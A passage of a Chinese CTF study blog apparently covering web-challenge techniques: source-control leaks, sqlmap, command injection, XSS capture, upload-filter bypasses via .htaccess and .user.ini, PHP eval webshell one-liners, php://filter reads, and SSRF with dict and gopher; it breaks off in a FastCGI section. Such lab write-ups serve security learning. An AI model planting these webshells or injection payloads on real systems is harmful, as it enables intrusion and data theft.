#查看提交历史</p></blockquote><p><strong>方法一：</strong><br>在目标文件夹终端直接git show出答案</p><blockquote><p>git show：显示一个或多个对象(<code>blobs</code>，树，标签和提交)。对于提交，它还能<strong>显示日志消息和文本差异。</strong></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210120134849174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><strong>方法二：</strong><br>也可以使用git reset –hard “add flag的那个序列号”回退存有flag的版本</p><blockquote><p>git reset 序列号：回退版本</p></blockquote><p>此时文件夹内出现50x和index以及一个flag的txt<br><img src="https://img-blog.csdnimg.cn/20210121000823424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><blockquote><p> dvcs-ripper 参数:</p><p> -c     perform ‘hg revert’ on end (default)<br> -b &lt;s&gt; Use branch &lt;s&gt; (default: )<br> -a &lt;s&gt; Use agent &lt;s&gt; (default: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:10.0.2) Gecko/20100101 Firefox/10.0.2)<br> -s     do not verify SSL cert<br> -p &lt;h&gt; use proxy <h> for connections<br> -v     verbose (-vv will be more verbose)</p></blockquote><h2 id="svn泄露"><a href="#svn泄露" class="headerlink" title="svn泄露"></a>svn泄露</h2><p> <img src="https://img-blog.csdnimg.cn/20210311104348703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="hg泄露"><a href="#hg泄露" class="headerlink" title="hg泄露"></a>hg泄露</h2><p><img src="https://img-blog.csdnimg.cn/20210311104126693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>原文件不存在，直接在url得到<img src="https://img-blog.csdnimg.cn/20210311104220836.png"></p><hr><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>使用sqlmap<br>整数型以及字符型：<br><code>python3 sqlmap.py -u &quot;url&quot; --cookie=&quot;&quot; </code>（Ⅰ）<br>（Ⅰ）跟参数–current-db<br>（Ⅰ）跟参数-D 数据库名 –tables<br>（Ⅰ）跟参数-D 数据库名 -T 表名 –columns<br>（Ⅰ）跟参数-D 数据库名 -T 表名 (-Ｃ 列名) –dump</p><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p><code>127.0.0.1&amp;ls</code><br>出来一个<code>*.php</code><br>此时拼接<code>cat *.php</code>无回显（<a href="https://xz.aliyun.com/t/8125">传送门</a>）<br>此处是字符编码的问题 后面跟<code>| base64</code>出现一堆字符后复制解码即可</p><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>在xss平台上注册账号 建立一个项目（勾选默认配置即可）<br>复制xss代码<br><img src="https://img-blog.csdnimg.cn/20210218112452696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"> 先在第一栏随便输入字符<br>然后复制url到第二栏 并且更改刚刚的字符 替换拼接为xss代码<br>发送至服务器即可<br><img src="https://img-blog.csdnimg.cn/20210218112842968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">在项目里边可以看到反弹回来的内容<br><img src="https://img-blog.csdnimg.cn/20210218112901552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><p>vim是一种开源编辑器，由于在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容：<br>第一次产生的交换文件名为 <code>. .swp</code><br>再次意外退出后，将会产生名为<code>. .swo</code>的交换文件<br>第三次产生的交换文件则为<code> . .swn</code><br>此题使用终端命令<code>vim -r index.php.swp</code>恢复原文件即可</p><h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h2><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。<br>利用工具dsstore:<code>python3 main.py .DS_Store</code>导出一个文本文件</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><a href="https://www.secpulse.com/archives/95987.html">文件上传常见姿势</a></p><h4 id="js前端验证"><a href="#js前端验证" class="headerlink" title="js前端验证"></a>js前端验证</h4><p>写一个一句话木马 查看源码可知只允许上传图片格式<br>更改文件后缀名 抓包后改回后缀 上传后连接蚁剑<br>也可以直接禁用js直接上传</p><p>DVWA中级文件上传则是通过Content-Type在服务端MIME检测</p><h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4><p>修改Content-Type为image/jpeg、image/png、image/gif</p><h4 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h4><p>百度百科：<img src="https://img-blog.csdnimg.cn/20210223002229696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>利用条件</p><ul><li><p><input checked="" disabled="" type="checkbox">  apache服务器</p></li><li><p><input checked="" disabled="" type="checkbox">  能够上传.htaccess文件，一般为黑名单限制。</p></li><li><p><input checked="" disabled="" type="checkbox">  AllowOverride All，默认配置为关闭None。</p></li><li><p><input checked="" disabled="" type="checkbox">  上传目录具有可执行权限LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态 </p></li></ul><p>写一个<code>.htaccess</code>文件：</p><ul><li>正则匹配名为test的文件 当作php文件解析 ：</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;test&quot;</span>&gt;</span><br> <span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>或：</p><ul><li>以php解析.htaccess文件所在目录及其子目录中的后缀为.xxx的文件文件</li></ul> <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php xxx<br><br>(AddHandler php5-<span class="hljs-keyword">script</span> php)<br></code></pre></td></tr></table></figure><p>然后直接一句话以php解析.htaccess文件所在目录及其子目录中的所有文件 上传一个test.jpg的一句话木马，然后连接蚁剑即可</p><h4 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h4><p>上面的是对apache起作用的，而这个是对以fastcgi运行的php起作用的，不管他的服务器是nginx/apache/IIS，范围更广</p><p>php.ini是php的配置文件，通常下载下来的php都没有这个文件，有两个预置的ini模板，php.ini-development和php.ini-production,前者是开发环境推荐的，允许调试，少占资源；后者是上线产品时的环境推荐，禁止报错，提高性能</p><p>php.ini包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 ini 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。在 <code>.user.ini</code> 风格的 ini 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 ini 设置可被识别</p><p><img src="https://wooyun.js.org/images_result/images/2014103002272568560.png"></p><p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p><p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的</p><p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载，然后我们看到php.ini中的配置项，但是只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”，其中有两个可以利用的配置点</p><p>auto_append_file和auto_prepend_file</p><p>前者是文件包含在要执行的文件后，后者是自动包含在要执行的文件前</p><p>在.user.ini写入</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">auto_prepend_file=xxx.jpg<span class="hljs-regexp">/png/gi</span>f<br></code></pre></td></tr></table></figure><p>然后上传一个一句话图片马</p><p>buu一道题为例 buu suctf CheckIn</p><p>上传.user.ini后上传一个图片 抓包改包</p><p>此题检测<code>&lt;?</code>需要对一句话进行变形具体见一句话的变形</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210606161438091.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210606161521279.png"></p><p><strong>00截断</strong><br>0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。%00和0x00,后台读取是遇到%00就会停止。举个例子，url中输入的是upload/post.php%00.jpg，那么后台读取到是upload/post.php，就实现了绕后目的。<br>00截断的限制条件：PHP&lt;5.3.29，且GPC关闭<br><strong>注意：00截断是在url的地方实现的</strong></p><p><img src="https://img-blog.csdnimg.cn/2021022323070732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>传图片马 burp抓包 改post后面的url<br><img src="https://img-blog.csdnimg.cn/20210223232427937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>蚁剑连接时注意修改url</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p><strong>php://input</strong><br>利用php伪协议 <a href="https://segmentfault.com/a/1190000018991087">滚去看啦:PHP伪协议总结</a><br><img src="https://img-blog.csdnimg.cn/20210302113044978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>在hackbar内写<code>/?php://input</code>后POST传参<code>&lt;?php system(&#39;&#39;);?&gt;</code>得到flag<br><strong>远程包含</strong><br>此题也可以利用伪协议解开 但此题考查的是个人vps的利用 待补<br><strong>读取源代码</strong><br>利用伪协议中的<code>php://filter</code><br>构造url<code>/?php://filter/read=convert.base64-encode/resource=/flag</code></p><p>关于php一句话：<br>如果在浏览器传参，使用””包裹php一句话，并且echo &gt;*.php的方式写入时时，则需要注意对$的转义，避免此类情况的发生，建议使用’’”包裹一句话</p><p>在windows下利用cmd的echo &gt;*.php 需要对尖括号进行转义（不必加引号包裹），即：<br><code>^&lt;?php @eval($_POST[&#39;pass&#39;]);?^&gt;</code></p><p>在linux下echo &gt;*.php：<br><code>&quot;&lt;?php @eval(\$_POST[&#39;pass&#39;]);?&gt;&quot;</code><br><code>&quot;&lt;?php @eval(\$_POST[\&quot;pass\&quot;]);?&gt;&quot;</code><br><code>&#39;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#39;</code><br><code>&#39;&lt;?php @eval($_POST[\&#39;pass\&#39;]);?&gt;&#39;</code></p><h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><p><code>$&#123;IFS&#125;</code><br><code>$IFS$9</code><br><code>&lt;</code><br><code>&lt;&gt;</code><br><code>&#123;,&#125;</code><br>等可以代替空格<br>此题注释掉了答案而不回显 空格绕过后查看页面源码即可</p><h2 id="综合绕过"><a href="#综合绕过" class="headerlink" title="综合绕过"></a>综合绕过</h2><p>利用编码表打出组合拳<br><img src="https://img-blog.csdnimg.cn/20210313110431187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><p>读取Web目录下的flag.php 考了个常识，web目录在：<code>var/www/html</code><br>直接用读取文件的伪协议:<code>file:///var/www/html</code></p><h2 id="在线扫描端口"><a href="#在线扫描端口" class="headerlink" title="在线扫描端口"></a>在线扫描端口</h2><p>这里熟悉一个协议：<br>dict协议(2628)：<a href="http://www.dict.org是一个线上的字典查询网站(真就查单词的)/">www.dict.org是一个线上的字典查询网站(真就查单词的)</a> 能想到用这个协议来探测端口的也是人才<br>原理：（待补）<br>可以在命令行里连接玩一下 telnet ip 2628<br>help 查看帮助<br>define * (要查询的单词)<br><img src="https://img-blog.csdnimg.cn/20210313170807589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>好了 这是官方文档中dict://语法</p><p><img src="https://img-blog.csdnimg.cn/20210313170835224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>首先在地址栏构造<code>?url=dict://127.0.0.1:8000</code><br>由于dict://协议是一条一条执行的 需要让浏览器逐个访问8<del>9K的端口<br>从字典爆破的角度考虑，那么抓包，放到intruder，将端口标记，爆破模式选择number，设置8</del>9K的范围，爆破完毕，倒叙查看长度，payload为8057，回到浏览器访问该端口即可<br><img src="https://img-blog.csdnimg.cn/20210313171505715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210313171540971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210313171710798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">插一句，也可以直接访问127.0.0.1加端口再挂burp爆破</p><p><img src="https://img-blog.csdnimg.cn/20210314180743119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>这里的题目开始难度跨越很厉害了 得去学习一些涉及到的协议了</p><p>首先，什么是<code>gopher协议</code><img src="https://img-blog.csdnimg.cn/20210320203305300.png"></p><blockquote><p>Gopher是Internet上一个非常有名的信息查找系统，由明尼苏达大学设计，并以该校的运动队“金色地鼠”（俚语：“去找”）来命名。在时间上，比Internet还要早几年。它只支持文本，不支持图像。该协议将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。允许用户使用层叠结构的菜单与文件，以发现和检索信息，Gopher客户程序和Gopher服务器相连接，并能使用菜单结构显示其它的菜单、文档或文件，并索引。同时可通过Telnet远程访问其它应用程序。Gopher协议使得Internet上的所有Gopher客户程序，能够与Internet上的所有已“注册”的Gopher服务器进行对话。<br>Gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求：gopher协议支持发出GET、POST请求，先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）<br>在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它</p></blockquote><p><strong><code>gopher协议没有默认端口，所以需要指定web端口，而且需要指定POST方法。回车换行使用%0D%0A替换%0A,POST参数之间的&amp;分隔符也要进行url编码</code></strong></p><p>因此 为了使用gopher协议进行攻击 就必须将<code>&amp;</code>进行url编码（第一次） 而gopher协议将上面第一次的字符串传进服务器时 url解码（一次） 此时又会出现字符<code>&amp;</code> 而此时的url里gopher并不认可即将继续跳转的地址（含有未转码的&amp;） 因此我们要让第一次的<code>&amp;</code>转码<code>%26</code>再次转码为<code>%2526</code> 最后需要将上面的内容装进gopher协议里 所以进行最后一次转码 放进url里</p><p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470">ssrf对gopher协议的利用</a></p><ul><li>做题步骤</li></ul><p>dirsearch -&gt; 利用php伪协议file://访问一下 得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    header(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$ch</span> = curl_init();<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br>curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-variable">$flag</span>=getenv(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br><span class="hljs-variable">$key</span> = md5(<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>] == <span class="hljs-variable">$key</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;form action=<span class="hljs-string">&quot;/flag.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;key&quot;</span>&gt;<br>&lt;!-- Debug: key=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>;<span class="hljs-meta">?&gt;</span>--&gt;<br>&lt;/form&gt;<br>    <br><span class="hljs-comment">//要求访问的远程地址必须为127.0.0.1(相当于实战中必须让远程目标主机本地访问)</span><br></code></pre></td></tr></table></figure><p>前端访问一下flag.php，查看源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;key&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- De<span class="hljs-doctag">bug:</span> key=399be68d73e23ae8f326b4850128f33c--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>用post的方式把key传进flag.php -&gt; 构造带key的POST包  抓包重放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">POST /flag.php HTTP/1.1<br>Host: 127.0.0.1<br>User-Agent: curl<br>Accept: */*<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 36<br><br>key=---<br>#注意此处的Content-Length要与POST内容长度一致<br>#上面的整个POST包进行url编码<br>#将得到的编码中的所有%0A(数字0) 替换为%0D%0A (%0A为换行符——另起一新行，光标在新行的开头；%0D为回车——光标回到旧行(光标当前所在的行)的开头 <br>#再将上面得到的编码再一次编码！<br></code></pre></td></tr></table></figure><p>将上面得到的拼接<strong>gopher协议</strong>重放即可 <img src="https://img-blog.csdnimg.cn/20210314175949642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><a href="https://blog.csdn.net/weixin_46203060/article/details/109548606?spm=1001.2014.3001.5501">wp参考博客</a></p><h2 id="文件上传-SSRF"><a href="#文件上传-SSRF" class="headerlink" title="文件上传(SSRF)"></a>文件上传(SSRF)</h2><p>同上一题查看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$ch</span> = curl_init();<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br>curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> getenv(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Upload Webshell：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 这里在html表单里再加一行file换成submit 增加一个文件上传的按钮 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上传一个文件 抓包改包和上一题差不多 但不需要构造post包</p><h2 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h2><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p><p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p><p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p><p>和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 